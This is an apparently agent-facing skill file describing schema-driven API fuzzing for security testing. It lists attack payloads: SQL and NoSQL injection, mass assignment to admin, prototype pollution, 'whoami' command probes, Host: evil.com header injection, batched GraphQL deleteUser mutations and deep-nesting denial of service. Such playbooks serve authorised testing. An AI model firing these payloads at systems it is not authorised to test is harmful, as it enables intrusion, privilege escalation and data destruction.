---
name: hunt-api-fuzzing
description: Schema-driven API fuzzing — use OpenAPI/GraphQL schemas to systematically fuzz every parameter, header, and body field for injection, type confusion, and boundary violations.
triggers:
  - api fuzzing
  - schema fuzzing
  - parameter fuzzing
  - openapi
  - boundary testing
priority: 70
---

# hunt-api-fuzzing — Schema-Driven API Fuzzing

## Approach

Use the target's own API schema (OpenAPI, GraphQL introspection) as a fuzzing map.
Every declared parameter, body field, and header is a test input.

## Method

### 1. Schema-Guided Parameter Fuzzing

For each endpoint with parameters:
```bash
# For each param declared in OpenAPI/GraphQL:
# 1. Type confusion: send wrong types (string where int expected, array where string)
# 2. Boundary values: empty, null, max-length, negative, zero
# 3. Injection: SQL, NoSQL, SSTI, command injection payloads
# 4. Format bypass: Unicode, null bytes, double encoding
```

### 2. Type Confusion Attacks
```json
// If API expects integer id:
{"id": "1 OR 1=1"}           // SQL injection via type confusion
{"id": ["1", "2"]}            // Array parameter pollution
{"id": {"$gt": ""}}           // NoSQL operator injection
{"id": true}                  // Boolean confusion
{"id": null}                  // Null handling
{"id": -1}                    // Negative value
{"id": 99999999999999}        // Integer overflow
```

### 3. Missing/Extra Field Injection
```json
// Add fields not in the schema
{"name": "test", "role": "admin"}           // Mass assignment
{"name": "test", "__proto__": {"admin": 1}} // Prototype pollution
{"name": "test", "id": 1}                   // ID injection
{"name": "test", "verified": true}          // Status bypass
```

### 4. Content-Type Confusion
```bash
# Same body, different Content-Type
Content-Type: application/json    → {"cmd": "whoami"}
Content-Type: application/xml     → <cmd>whoami</cmd>
Content-Type: text/plain          → cmd=whoami
Content-Type: application/x-www-form-urlencoded → cmd=whoami
```

### 5. Header Injection
```
X-Forwarded-For: 127.0.0.1      # IP spoofing
X-Original-URL: /admin           # Path override
X-Rewrite-URL: /admin            # Path override
Host: evil.com                    # Host header injection
```

### 6. GraphQL-Specific
```graphql
# Batch queries (bypass rate limiting)
[{"query":"mutation{deleteUser(id:1)}"}, {"query":"mutation{deleteUser(id:2)}"}]

# Deep nesting (DoS / resource exhaustion)
{user{friends{friends{friends{friends{name}}}}}}

# Field suggestion exploitation
{__type(name:"User"){fields{name type{name}}}}
```

## Validation

- Every finding must show a security-relevant behavior change (not just a 500 error)
- Type confusion → SQL injection must show data extraction, not just error
- Mass assignment must show privilege escalation or data corruption
- Rate limiting bypass must show actual impact (not just batch capability)
